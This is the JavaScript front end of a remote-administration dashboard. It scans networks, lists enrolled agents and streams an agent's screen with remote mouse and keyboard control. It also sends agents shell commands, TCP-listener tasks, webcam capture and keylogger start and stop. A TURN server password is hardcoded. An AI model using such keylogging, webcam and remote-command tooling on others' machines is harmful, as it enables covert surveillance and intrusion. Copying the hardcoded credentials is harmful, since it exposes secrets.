(function () {
    'use strict';

    var BASE_PATH = '/eXT.Qli';
    var SIGNALING_URL = BASE_PATH + '/backend/api/signaling.php';
    var VIEWER_ID = 'viewer-' + Math.random().toString(36).slice(2) + Date.now().toString(36);

    var allResults = [];
    var agentsList = [];
    var agentPollTimer = null;
    var devicesPollTimer = null;

    var currentScreenAgentUuid = '';
    var isScreenViewing = false;
    var currentAgentAdminTab = 'agents';

    // WebRTC
    var pc = null;
    var dataChannel = null;
    var remoteVideo = null;
    var remoteControlEnabled = false;
    var answerPollInterval = null;

    var remoteScreenWidth = 1920;
    var remoteScreenHeight = 1080;

    var lastMouseMoveTime = 0;
    var MOUSE_MOVE_INTERVAL_MS = 33;

    var STREAM_QUALITY = {
        maxBitrateKbps: 8000,
        frameRateCap:   30
    };

    var commandInput, executeCmdBtn, tcpPort, tcpMessage, startTcpBtn, stopTcpBtn, tcpStatus,
        quickScreenshotBtn, quickWebcamBtn, quickKeyloggerStartBtn, quickKeyloggerStopBtn, quickInfoBtn,
        taskResultsLog;

    function byId(id) {
        return document.getElementById(id);
    }

    function qsa(selector) {
        return Array.prototype.slice.call(document.querySelectorAll(selector));
    }

    function escapeHtml(value) {
        return String(value == null ? '' : value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function hidePageLoader() {
        var loader = byId('pageLoader');
        if (!loader) return;
        loader.classList.add('is-hidden');
        setTimeout(function () {
            if (loader && loader.parentNode) loader.parentNode.removeChild(loader);
        }, 350);
    }

    function setStatus(message) { var el = byId('statusBar'); if (el) el.textContent = message || 'Ready'; }
    function setSummary(message) { var el = byId('scanSummary'); if (el) el.textContent = message || 'No scan yet.'; }
    function setRawOutput(text) { var el = byId('rawOutput'); if (el) el.textContent = text || 'No scan yet.'; }
    function setAgentStatus(message) { var el = byId('agentStatusBar'); if (el) el.textContent = message || 'Loading agents...'; }
    function setDevicesStatus(message) { var el = byId('devicesStatusBar'); if (el) el.textContent = message || 'Loading saved devices...'; }
    function setScreenStatus(message) { var el = byId('screenStatusBar'); if (el) el.textContent = message || 'Waiting for a selected agent.'; }

    function showScreenEmptyState(show) {
        var emptyState = byId('screenEmptyState');
        var stage = byId('screenStage');
        var frame = byId('remoteScreenVideo');
        if (emptyState) emptyState.style.display = show ? 'flex' : 'none';
        if (stage) {
            stage.classList.toggle('is-empty', show);
            stage.classList.toggle('has-frame', !show);
        }
        if (frame) frame.style.display = show ? 'none' : 'block';
    }

    function renderResults(items) {
        var resultsBox = byId('scanResults');
        if (!resultsBox) return;
        if (!Array.isArray(items) || !items.length) {
            resultsBox.innerHTML = '<div class="empty-state">No matching hosts found.</div>';
            return;
        }
        resultsBox.innerHTML = items.map(function (item) {
            return '<div class="result-item"><div class="result-top"><div class="result-ip">' + escapeHtml(item.ip || '') + '</div><div class="result-hostname">' + escapeHtml(item.hostname || '') + '</div></div></div>';
        }).join('');
    }

    function filterResults() {
        var searchInput = byId('searchInput');
        var term = searchInput ? searchInput.value.trim().toLowerCase() : '';
        if (!term) { renderResults(allResults); return; }
        var filtered = allResults.filter(function (item) {
            var haystack = [item.ip || '', item.hostname || '', item.mac || item.mac_address || '', item.vendor || '', item.os || item.os_name || ''].join(' ').toLowerCase();
            return haystack.indexOf(term) !== -1;
        });
        renderResults(filtered);
    }

    function setLoadingState(isLoading) {
        ['startScanBtn', 'detectScanBtn', 'refreshListBtn'].forEach(function (id) {
            var el = byId(id);
            if (el) el.disabled = isLoading;
        });
    }

    function runScan(mode) {
        var subnetInput = byId('subnetInput');
        var target = subnetInput ? subnetInput.value.trim() : '';
        setLoadingState(true);
        setStatus('Scanning...');
        setSummary('Scanning target...');
        setRawOutput('Scanning...');
        fetch(BASE_PATH + '/backend/api/scan.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target: target, mode: mode || 'scan' })
        })
        .then(function (r) { return r.json(); })
        .then(function (data) {
            if (!data.success) throw new Error(data.message || 'Scan failed.');
            allResults = Array.isArray(data.results) ? data.results : [];
            setStatus(data.message || 'Scan completed.');
            setSummary('Hosts: ' + (data.hosts_up || 0));
            setRawOutput(data.raw_output || 'No raw output.');
            filterResults();
            loadDevices();
        })
        .catch(function (err) {
            setStatus('Error: ' + err.message);
            setSummary('Scan failed.');
            setRawOutput(err.message || 'Unknown scan error.');
        })
        .finally(function () { setLoadingState(false); });
    }

    function formatAgentStatus(isOnline) {
        return isOnline ? '<span class="agent-badge agent-online">Online</span>' : '<span class="agent-badge agent-offline">Offline</span>';
    }

    function renderAgents(list) {
        var tbody = byId('agentsTableBody');
        if (!tbody) return;
        list = Array.isArray(list) ? list : [];
        agentsList = list;
        if (!list.length) {
            setAgentStatus('No agents connected.');
            tbody.innerHTML = '<tr><td colspan="11">No agents yet.</td>';
            populateScreenAgentOptions([]);
            return;
        }
        setAgentStatus('Connected agents: ' + list.length);
        tbody.innerHTML = list.map(function (a) {
            return '<tr>' +
                '<td>' + formatAgentStatus(!!a.is_online) + '</td>' +
                '<td>' + escapeHtml(a.hostname || '-') + '</td>' +
                '<td>' + escapeHtml(a.local_ip || '-') + '</td>' +
                '<td>' + escapeHtml(a.os_name || '-') + '</td>' +
                '<td>' + escapeHtml(a.architecture || '-') + '</td>' +
                '<td>' + escapeHtml(a.cpu_info || '-') + '</td>' +
                '<td>' + escapeHtml(a.ram_mb || '0') + '</td>' +
                '<td>' + escapeHtml(a.disk_free_gb || '0') + '</td>' +
                '<td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td>' +
                '<td>' + escapeHtml(a.last_seen || '-') + '</td>' +
                '<td><div class="table-action-stack"><button class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button><button class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button></div></td>' +
                '</tr>';
        }).join('');
        populateScreenAgentOptions(list);
    }

    function populateScreenAgentOptions(list) {
        var select = byId('screenAgentSelect');
        if (!select) return;
        var current = currentScreenAgentUuid || select.value || '';
        var options = ['<option value="">Select an agent</option>'];
        list.forEach(function (agent) {
            var value = String(agent.agent_uuid || '');
            var label = (agent.hostname || value || 'Unknown Agent') + ' (' + (agent.local_ip || '-') + ')';
            options.push('<option value="' + escapeHtml(value) + '"' + (current === value ? ' selected' : '') + '>' + escapeHtml(label) + '</option>');
        });
        select.innerHTML = options.join('');
    }

    function loadAgents() {
        fetch(BASE_PATH + '/backend/api/agents.php', { method: 'GET', headers: { 'Accept': 'application/json' } })
        .then(function (r) { return r.json(); })
        .then(function (data) {
            if (!data.success) throw new Error(data.message || 'Failed to load agents.');
            renderAgents(data.data || []);
        })
        .catch(function (err) { setAgentStatus('Agent load error: ' + err.message); });
    }

    function renderDevices(list) {
        var tbody = byId('devicesTableBody');
        if (!tbody) return;
        list = Array.isArray(list) ? list : [];
        if (!list.length) {
            tbody.innerHTML = '<tr><td colspan="7">No saved devices found.</td>';
            return;
        }
        tbody.innerHTML = list.map(function (row) {
            return '<tr>' +
                '<td>' + escapeHtml(row.ip_address || '-') + '</td>' +
                '<td>' + escapeHtml(row.hostname || '-') + '</td>' +
                '<td>' + escapeHtml(row.mac_address || '-') + '</td>' +
                '<td>' + escapeHtml(row.vendor || '-') + '</td>' +
                '<td>' + escapeHtml(row.status || '-') + '</td>' +
                '<td>' + escapeHtml(row.last_seen || '-') + '</td>' +
                '<td><button class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td>' +
                '</tr>';
        }).join('');
    }

    function loadDevices() {
        var searchInput = byId('deviceSearchInput');
        var query = searchInput ? searchInput.value.trim() : '';
        var url = BASE_PATH + '/backend/api/devices.php' + (query ? '?search=' + encodeURIComponent(query) : '');
        setDevicesStatus('Loading saved devices...');
        fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } })
        .then(function (r) { return r.json(); })
        .then(function (data) {
            if (!data.success) throw new Error(data.message || 'Failed to load devices.');
            renderDevices(data.devices || []);
            setDevicesStatus('Saved devices: ' + ((data.devices || []).length));
        })
        .catch(function (err) { setDevicesStatus('Saved devices error: ' + err.message); });
    }

    function deleteSavedDevice(id) {
        if (!id || !window.confirm('Delete this saved device?')) return;
        fetch(BASE_PATH + '/backend/api/delete_device.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: id })
        })
        .then(function (r) { return r.json(); })
        .then(function (data) {
            if (!data.success) throw new Error(data.message || 'Delete failed.');
            loadDevices();
        })
        .catch(function (err) { setDevicesStatus('Delete error: ' + err.message); });
    }

    function sendAgentTask(agentUUID, task) {
        fetch(BASE_PATH + '/backend/api/send_agent_task.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ agent_uuid: agentUUID, task: task })
        })
        .then(function (res) { return res.json(); })
        .then(function () { loadAgents(); })
        .catch(function (err) { console.error('Task send error:', err); });
    }

    function generateTaskId() { return Date.now() + '-' + Math.random().toString(36).substr(2, 8); }

    function addTaskResultToLog(taskId, status, output) {
        var log = byId('taskResultsLog');
        if (!log) return;
        if (log.innerHTML.includes('No tasks executed yet.')) log.innerHTML = '';
        var entry = document.createElement('div');
        entry.className = 'result-item';
        entry.innerHTML = '<div class="result-top"><strong>Task ' + escapeHtml(taskId) + '</strong> – ' + escapeHtml(status) + '</div><pre class="raw-output" style="margin-top:8px; margin-bottom:0;">' + escapeHtml(output) + '</pre>';
        log.prepend(entry);
    }

    function sendTask(agentUUID, task, data, taskId) {
        if (!agentUUID) { console.warn('No agent selected'); return; }
        if (!taskId) taskId = generateTaskId();
        var payload = { agent_uuid: agentUUID, task: task, task_id: taskId, data: data || {} };
        fetch(BASE_PATH + '/backend/api/send_agent_task.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(function (r) { return r.json(); })
        .then(function (resp) {
            if (!resp.success) addTaskResultToLog(taskId, 'error', 'Failed to send task: ' + (resp.message || 'unknown error'));
            else addTaskResultToLog(taskId, 'pending', 'Task sent, waiting for result...');
        })
        .catch(function (err) { addTaskResultToLog(taskId, 'error', 'Network error: ' + err.message); });
    }

    function getSelectedAgentUUID() {
        var select = byId('screenAgentSelect');
        return (select && select.value) ? select.value : '';
    }

    function mutateSdpForQuality(sdp, maxKbps, frameRateCap) {
        var lines     = sdp.split('\r\n');
        var out       = [];
        var inVideo   = false;
        var bInjected = false;
        var vp8Pt     = null;

        lines.forEach(function (l) {
            var m = l.match(/^a=rtpmap:(\d+) VP8\/90000/i);
            if (m) vp8Pt = m[1];
        });

        for (var i = 0; i < lines.length; i++) {
            var line = lines[i];

            if (line.indexOf('m=video') === 0) {
                inVideo   = true;
                bInjected = false;
            } else if (line.indexOf('m=') === 0 && line.indexOf('m=video') !== 0) {
                inVideo = false;
            }

            out.push(line);

            if (inVideo && !bInjected && line.indexOf('c=') === 0) {
                out.push('b=AS:'   + maxKbps);
                out.push('b=TIAS:' + (maxKbps * 1000));
                bInjected = true;
            }

            if (inVideo && vp8Pt && line.indexOf('a=fmtp:' + vp8Pt + ' ') === 0) {
                out.pop();
                out.push(
                    line
                    + ';x-google-max-bitrate='   + maxKbps
                    + ';x-google-min-bitrate='   + Math.round(maxKbps * 0.1)
                    + ';x-google-start-bitrate=' + Math.round(maxKbps * 0.3)
                );
            }

            if (inVideo && line.indexOf('a=rtpmap:') === 0 && vp8Pt &&
                line.indexOf('VP8/90000') !== -1 && frameRateCap) {
                var hasFmtp = lines.some(function (l) {
                    return l.indexOf('a=fmtp:' + vp8Pt + ' ') === 0;
                });
                if (!hasFmtp) {
                    out.push('a=fmtp:' + vp8Pt + ' max-fr=' + frameRateCap
                        + ';x-google-max-bitrate='   + maxKbps
                        + ';x-google-min-bitrate='   + Math.round(maxKbps * 0.1)
                        + ';x-google-start-bitrate=' + Math.round(maxKbps * 0.3));
                }
            }
        }
        return out.join('\r\n');
    }

    async function createWebRTCOffer(agentUuid) {
        console.log('[DEBUG] createWebRTCOffer called for agent:', agentUuid);
        if (pc) {
            console.log('[DEBUG] Closing existing RTCPeerConnection');
            pc.close();
            pc = null;
        }

        // TURN configuration with TCP fallback
        const TURN_SERVER = 'turn:10.201.0.254:3478?transport=tcp';
        const TURN_USERNAME = 'tachyon';
        const TURN_CREDENTIAL = 'TachyonDragon107';

        const configuration = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: TURN_SERVER, username: TURN_USERNAME, credential: TURN_CREDENTIAL }
            ]
        };
        console.log('[DEBUG] Creating new RTCPeerConnection with config:', configuration);
        pc = new RTCPeerConnection(configuration);
        remoteVideo = byId('remoteScreenVideo');
        if (!remoteVideo) {
            console.error('[DEBUG] remoteScreenVideo element not found');
            return;
        }

        pc.onconnectionstatechange = () => {
            console.log('[DEBUG] pc.connectionState =', pc.connectionState);
            if (pc.connectionState === 'connected') {
                setScreenStatus('Streaming active');
                showScreenEmptyState(false);
                var videoEl = byId('remoteScreenVideo');
                if (videoEl && videoEl.srcObject && videoEl.paused) {
                    videoEl.play().catch(function (e) {
                        console.warn('[DEBUG] video play retry failed:', e);
                    });
                }
            } else if (pc.connectionState === 'failed') {
                setScreenStatus('Connection failed — TURN auth error or network unreachable. Try reconnecting.');
            } else if (pc.connectionState === 'disconnected') {
                setScreenStatus('Connection disconnected. Try reconnecting.');
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log('[DEBUG] pc.iceConnectionState =', pc.iceConnectionState);
        };
        pc.onicecandidate = (event) => {
            if (event.candidate) {
                console.log('[DEBUG] ICE candidate gathered:', event.candidate.candidate);
            } else {
                console.log('[DEBUG] ICE gathering completed (null candidate)');
            }
        };

        console.log('[DEBUG] Adding recvonly video transceiver');
        pc.addTransceiver('video', { direction: 'recvonly' });

        pc.ontrack = async (event) => {
            console.log('[DEBUG] ontrack fired:', event.track.kind, event.streams);
            const videoEl = document.getElementById('remoteScreenVideo');
            if (!(videoEl instanceof HTMLVideoElement)) {
                console.error('[DEBUG] remoteScreenVideo is not a <video> element:', videoEl);
                setScreenStatus('Render failed: remote video element not found or invalid.');
                return;
            }
            const stream = (event.streams && event.streams[0])
                ? event.streams[0]
                : new MediaStream([event.track]);
            videoEl.srcObject = stream;
            videoEl.muted = true;
            videoEl.autoplay = true;
            videoEl.playsInline = true;
            videoEl.style.display = 'block';
            videoEl.style.width = '100%';
            videoEl.style.height = '100%';
            videoEl.onloadedmetadata = () => {
                console.log('[DEBUG] video element metadata loaded, dimensions:', videoEl.videoWidth, videoEl.videoHeight);
            };
            try {
                await videoEl.play();
                console.log('[DEBUG] video.play() succeeded');
                showScreenEmptyState(false);
                setScreenStatus('Streaming active');
            } catch (err) {
                console.error('[DEBUG] video.play() error:', err);
                setScreenStatus('Playback failed: ' + err.message);
            }
        };

        console.log('[DEBUG] Creating data channel "controlChannel"');
        dataChannel = pc.createDataChannel("controlChannel");
        dataChannel.onopen = () => {
            console.log('[DEBUG] Data channel opened, readyState:', dataChannel.readyState);
            dataChannel.send(JSON.stringify({
                type:              'set_quality',
                max_bitrate_kbps:  STREAM_QUALITY.maxBitrateKbps,
                frame_rate:        STREAM_QUALITY.frameRateCap
            }));
            console.log('[DEBUG] Quality config sent to agent:', STREAM_QUALITY);
        };
        dataChannel.onclose = () => {
            console.log('[DEBUG] Data channel closed, readyState:', dataChannel.readyState);
        };
        dataChannel.onerror = (err) => {
            console.error('[DEBUG] Data channel error:', err);
        };
        dataChannel.onmessage = (event) => {
            console.log('[DEBUG] Message from agent:', event.data);
        };

        console.log('[DEBUG] Creating offer');
        const offer = await pc.createOffer();
        console.log('[DEBUG] Offer created, setting local description');
        await pc.setLocalDescription(offer);

        console.log('[DEBUG] Waiting for ICE gathering...');
        await new Promise((resolve) => {
            if (pc.iceGatheringState === 'complete') {
                resolve();
            } else {
                pc.onicegatheringstatechange = () => {
                    if (pc.iceGatheringState === 'complete') {
                        console.log('[DEBUG] ICE gathering completed');
                        resolve();
                    }
                };
                // Increased timeout to 15 seconds
                setTimeout(() => {
                    console.warn('[DEBUG] ICE gathering timeout after 15s, proceeding anyway');
                    resolve();
                }, 15000);
            }
        });
        console.log('[DEBUG] ICE gathering state:', pc.iceGatheringState);

        var rawOfferSdp   = pc.localDescription.sdp;
        console.log('[DEBUG] Raw offer SDP length:', rawOfferSdp.length);
        var mutatedOfferSdp = mutateSdpForQuality(
            rawOfferSdp,
            STREAM_QUALITY.maxBitrateKbps,
            STREAM_QUALITY.frameRateCap
        );
        console.log('[DEBUG] Mutated offer SDP length:', mutatedOfferSdp.length);
        console.log('[DEBUG] Offer SDP munged for quality (maxBitrateKbps=%d, frameRateCap=%d)',
            STREAM_QUALITY.maxBitrateKbps, STREAM_QUALITY.frameRateCap);

        console.log('[DEBUG] Submitting offer to signaling server for agent:', agentUuid);
        const response = await fetch(SIGNALING_URL + '?action=submit_offer&agent_uuid=' + encodeURIComponent(agentUuid), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                viewer_id: VIEWER_ID,
                offer_sdp: mutatedOfferSdp
            })
        });
        const data = await response.json();
        if (!data.success) throw new Error('Failed to submit offer: ' + (data.message || 'unknown'));
        console.log('[DEBUG] Offer submitted successfully, waiting for answer...');

        if (answerPollInterval) clearInterval(answerPollInterval);
        answerPollInterval = setInterval(async () => {
            if (!pc) {
                console.log('[DEBUG] Answer poll: pc is null, clearing interval');
                clearInterval(answerPollInterval);
                return;
            }
            try {
                const pollResp = await fetch(SIGNALING_URL + '?action=poll_answer&viewer_id=' + VIEWER_ID);
                const pollData = await pollResp.json();
                if (pollData.has_answer) {
                    console.log('[DEBUG] Answer received, clearing poll interval');
                    clearInterval(answerPollInterval);
                    answerPollInterval = null;
                    const answer = new RTCSessionDescription({ type: 'answer', sdp: pollData.answer_sdp });
                    console.log('[DEBUG] Setting remote description (answer)');
                    await pc.setRemoteDescription(answer);
                    console.log('[DEBUG] Remote description set, connection should establish');
                } else {
                    console.log('[DEBUG] No answer yet, polling...');
                }
            } catch (err) {
                console.error('[DEBUG] Answer poll error:', err);
            }
        }, 2000);
    }

    function stopScreenView() {
        console.log('[DEBUG] stopScreenView called');
        if (pc) {
            pc.close();
            pc = null;
        }
        dataChannel = null;
        isScreenViewing = false;
        remoteControlEnabled = false;
        if (answerPollInterval) { clearInterval(answerPollInterval); answerPollInterval = null; }
        var remoteVideoEl = byId('remoteScreenVideo');
        if (remoteVideoEl) {
            remoteVideoEl.srcObject = null;
            remoteVideoEl.style.display = 'none';
        }
        setScreenStatus('Viewer stopped.');
        showScreenEmptyState(true);
    }

    function startScreenView() {
        console.log('[DEBUG] startScreenView called');
        var select = byId('screenAgentSelect');
        var agentUuid = select ? select.value : '';
        if (!agentUuid) { setScreenStatus('Select an agent first.'); return; }
        currentScreenAgentUuid = agentUuid;

        var agentData = agentsList.find(function (a) { return a.agent_uuid === agentUuid; });
        if (agentData && agentData.screen_width && agentData.screen_height) {
            remoteScreenWidth = agentData.screen_width;
            remoteScreenHeight = agentData.screen_height;
            console.log('[DEBUG] Agent screen resolution:', remoteScreenWidth, 'x', remoteScreenHeight);
        } else {
            remoteScreenWidth = 1920;
            remoteScreenHeight = 1080;
            console.log('[DEBUG] Agent screen resolution unknown, defaulting to 1920x1080');
        }

        isScreenViewing = true;
        setScreenStatus('Starting WebRTC stream...');
        showScreenEmptyState(false);
        createWebRTCOffer(agentUuid).catch(function (err) {
            console.error('[DEBUG] createWebRTCOffer error:', err);
            setScreenStatus('WebRTC start failed: ' + err.message);
            stopScreenView();
        });
    }

    function toggleFullscreen() {
        var stage = byId('screenStage');
        if (!stage) return;
        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
            (stage.requestFullscreen || stage.webkitRequestFullscreen).call(stage);
        } else {
            (document.exitFullscreen || document.webkitExitFullscreen).call(document);
        }
    }

    function updateRemoteOverlay() {
        var overlay = byId('remoteControlOverlay');
        if (overlay) overlay.style.display = (isScreenViewing && remoteControlEnabled) ? 'block' : 'none';
    }

    function sendInput(msg) {
        if (!remoteControlEnabled || !dataChannel || dataChannel.readyState !== "open") {
            console.log("[DEBUG] Cannot send input - remoteControlEnabled:", remoteControlEnabled,
                        "dataChannel:", !!dataChannel, "readyState:", dataChannel ? dataChannel.readyState : 'null');
            return;
        }
        dataChannel.send(JSON.stringify(msg));
        console.log("[DEBUG] Sent input:", msg);
    }

    function initRemoteControl() {
        var canvas = byId('remoteControlOverlay');
        if (!canvas) return;

        function getScaledCoords(clientX, clientY) {
            var rect = canvas.getBoundingClientRect();
            var scaleX = remoteScreenWidth / rect.width;
            var scaleY = remoteScreenHeight / rect.height;
            var x = (clientX - rect.left) * scaleX;
            var y = (clientY - rect.top) * scaleY;
            return {
                x: Math.max(0, Math.min(remoteScreenWidth, x)),
                y: Math.max(0, Math.min(remoteScreenHeight, y))
            };
        }
        canvas.addEventListener('mousemove', function (e) {
            if (!remoteControlEnabled) return;
            var now = Date.now();
            if (now - lastMouseMoveTime < MOUSE_MOVE_INTERVAL_MS) return;
            lastMouseMoveTime = now;
            var coords = getScaledCoords(e.clientX, e.clientY);
            sendInput({ event_type: 'mouse_move', x: Math.round(coords.x), y: Math.round(coords.y) });
        });
        canvas.addEventListener('mousedown', function (e) {
            e.preventDefault();
            if (!remoteControlEnabled) return;
            var button = e.button === 0 ? 'left' : (e.button === 2 ? 'right' : 'middle');
            sendInput({ event_type: 'mouse_click', button: button, pressed: true });
        });
        canvas.addEventListener('mouseup', function (e) {
            e.preventDefault();
            if (!remoteControlEnabled) return;
            var button = e.button === 0 ? 'left' : (e.button === 2 ? 'right' : 'middle');
            sendInput({ event_type: 'mouse_click', button: button, pressed: false });
        });
        canvas.addEventListener('wheel', function (e) {
            e.preventDefault();
            if (!remoteControlEnabled) return;
            var delta = e.deltaY > 0 ? -3 : 3;
            sendInput({ event_type: 'mouse_scroll', delta: delta });
        });
        canvas.addEventListener('contextmenu', function (e) { e.preventDefault(); });
        window.addEventListener('keydown', function (e) {
            if (!remoteControlEnabled) return;
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
            e.preventDefault();
            var key = e.key;
            if (key === ' ') key = 'space';
            else if (key === 'Enter') key = 'enter';
            else if (key === 'Control') key = 'ctrl';
            else if (key === 'Alt') key = 'alt';
            else if (key === 'Shift') key = 'shift';
            else if (key === 'ArrowUp') key = 'up';
            else if (key === 'ArrowDown') key = 'down';
            else if (key === 'ArrowLeft') key = 'left';
            else if (key === 'ArrowRight') key = 'right';
            sendInput({ event_type: 'key', key: key, pressed: true });
        });
        window.addEventListener('keyup', function (e) {
            if (!remoteControlEnabled) return;
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
            e.preventDefault();
            var key = e.key;
            if (key === ' ') key = 'space';
            else if (key === 'Enter') key = 'enter';
            else if (key === 'Control') key = 'ctrl';
            else if (key === 'Alt') key = 'alt';
            else if (key === 'Shift') key = 'shift';
            else if (key === 'ArrowUp') key = 'up';
            else if (key === 'ArrowDown') key = 'down';
            else if (key === 'ArrowLeft') key = 'left';
            else if (key === 'ArrowRight') key = 'right';
            sendInput({ event_type: 'key', key: key, pressed: false });
        });
    }

    function bindEvents() {
        var start = byId('startScanBtn');
        var detect = byId('detectScanBtn');
        var refresh = byId('refreshListBtn');
        var search = byId('searchInput');
        var deviceSearch = byId('deviceSearchInput');
        var deviceRefresh = byId('deviceRefreshBtn');
        var screenSelect = byId('screenAgentSelect');
        var refreshViewerAgentsBtn = byId('refreshViewerAgentsBtn');
        var startScreenViewBtn = byId('startScreenViewBtn');
        var stopScreenViewBtn = byId('stopScreenViewBtn');
        var fullscreenBtn = byId('fullscreenBtn');
        var remoteToggle = byId('remoteControlToggle');

        if (start) start.onclick = function () { runScan('scan'); };
        if (detect) detect.onclick = function () { runScan('detect'); };
        if (refresh) refresh.onclick = function () { filterResults(); loadAgents(); loadDevices(); };
        if (search) search.addEventListener('input', filterResults);
        if (deviceSearch) deviceSearch.addEventListener('input', loadDevices);
        if (deviceRefresh) deviceRefresh.onclick = loadDevices;

        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
            btn.addEventListener('click', function () { activateAgentAdminTab(btn.getAttribute('data-agent-admin-tab-trigger')); });
        });

        if (screenSelect) {
            screenSelect.addEventListener('change', function () {
                if (isScreenViewing) stopScreenView();
                currentScreenAgentUuid = screenSelect.value || '';
                setScreenStatus(currentScreenAgentUuid ? 'Selected agent. Click Start Viewing.' : 'Waiting for a selected agent.');
                remoteControlEnabled = false;
                if (remoteToggle) remoteToggle.checked = false;
                updateRemoteOverlay();
            });
        }
        if (refreshViewerAgentsBtn) refreshViewerAgentsBtn.onclick = loadAgents;
        if (startScreenViewBtn) startScreenViewBtn.onclick = startScreenView;
        if (stopScreenViewBtn) stopScreenViewBtn.onclick = stopScreenView;
        if (fullscreenBtn) fullscreenBtn.onclick = toggleFullscreen;
        if (remoteToggle) {
            remoteToggle.addEventListener('change', function () {
                remoteControlEnabled = remoteToggle.checked;
                updateRemoteOverlay();
                setScreenStatus((isScreenViewing ? 'Screen active. ' : 'Start viewing first. ') + 'Remote control ' + (remoteControlEnabled ? 'ON' : 'OFF'));
            });
        }

        commandInput = byId('commandInput');
        executeCmdBtn = byId('executeCmdBtn');
        tcpPort = byId('tcpPort');
        tcpMessage = byId('tcpMessage');
        startTcpBtn = byId('startTcpBtn');
        stopTcpBtn = byId('stopTcpBtn');
        tcpStatus = byId('tcpStatus');
        quickScreenshotBtn = byId('quickScreenshotBtn');
        quickWebcamBtn = byId('quickWebcamBtn');
        quickKeyloggerStartBtn = byId('quickKeyloggerStartBtn');
        quickKeyloggerStopBtn = byId('quickKeyloggerStopBtn');
        quickInfoBtn = byId('quickInfoBtn');
        taskResultsLog = byId('taskResultsLog');

        if (executeCmdBtn) {
            executeCmdBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                var cmd = commandInput.value.trim();
                if (!cmd) { setStatus('Enter a command.'); return; }
                sendTask(agentUUID, 'cmd', { command: cmd });
                addTaskResultToLog('pending', 'info', 'Executing: ' + cmd);
            };
        }
        if (startTcpBtn) {
            startTcpBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                var port = parseInt(tcpPort.value, 10);
                if (isNaN(port) || port < 1 || port > 65535) { setStatus('Invalid port.'); return; }
                var message = tcpMessage.value.trim();
                var data = { port: port, interactive: true };
                if (message) data.message = message;
                sendTask(agentUUID, 'tcp_server_start', data);
                tcpStatus.textContent = 'Starting...';
            };
        }
        if (stopTcpBtn) {
            stopTcpBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                sendTask(agentUUID, 'tcp_server_stop', {});
                tcpStatus.textContent = 'Stopping...';
            };
        }
        if (quickScreenshotBtn) quickScreenshotBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'screenshot', {}); else setStatus('Select agent.'); };
        if (quickWebcamBtn) quickWebcamBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'webcam', {}); else setStatus('Select agent.'); };
        if (quickKeyloggerStartBtn) quickKeyloggerStartBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'keylogger_start', {}); else setStatus('Select agent.'); };
        if (quickKeyloggerStopBtn) quickKeyloggerStopBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'keylogger_stop', {}); else setStatus('Select agent.'); };
        if (quickInfoBtn) quickInfoBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'collect_info', {}); else setStatus('Select agent.'); };
    }

    function activateAgentAdminTab(tabName) {
        var validTabs = { agents: 'agentAdminTabAgents', devices: 'agentAdminTabDevices', screen: 'agentAdminTabScreen', remote: 'agentAdminTabRemote' };
        currentAgentAdminTab = validTabs[tabName] ? tabName : 'agents';
        Object.keys(validTabs).forEach(function (key) {
            var panel = byId(validTabs[key]);
            if (panel) panel.hidden = key !== currentAgentAdminTab;
        });
        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
            btn.classList.toggle('is-active', btn.getAttribute('data-agent-admin-tab-trigger') === currentAgentAdminTab);
        });
    }

    function activateView(viewId, agentAdminTab) {
        qsa('.view-panel').forEach(function (panel) { panel.classList.toggle('is-active', panel.id === viewId); });
        qsa('.nav-link').forEach(function (btn) { btn.classList.toggle('is-active', btn.getAttribute('data-view-target') === viewId); });
        if (viewId === 'agentsView') activateAgentAdminTab(agentAdminTab || currentAgentAdminTab || 'agents');
    }

    function openScreenViewer(agentUuid) {
        activateView('agentsView', 'screen');
        currentScreenAgentUuid = agentUuid || '';
        var select = byId('screenAgentSelect');
        if (select && agentUuid) select.value = agentUuid;
        setScreenStatus('Selected agent. Click Start Viewing.');
    }

    function bindNavigation() {
        qsa('[data-view-target]').forEach(function (btn) {
            btn.addEventListener('click', function () {
                activateView(btn.getAttribute('data-view-target'), btn.getAttribute('data-agent-admin-tab') || '');
            });
        });
    }

    document.addEventListener('DOMContentLoaded', function () {
        console.log('[DEBUG] DOMContentLoaded, initializing app');
        bindNavigation();
        bindEvents();
        initRemoteControl();
        setStatus('Ready');
        setSummary('No scan yet.');
        setRawOutput('No scan yet.');
        setDevicesStatus('Loading saved devices...');
        setScreenStatus('Waiting for a selected agent.');
        activateView('scannerView');
        activateAgentAdminTab('agents');
        loadAgents();
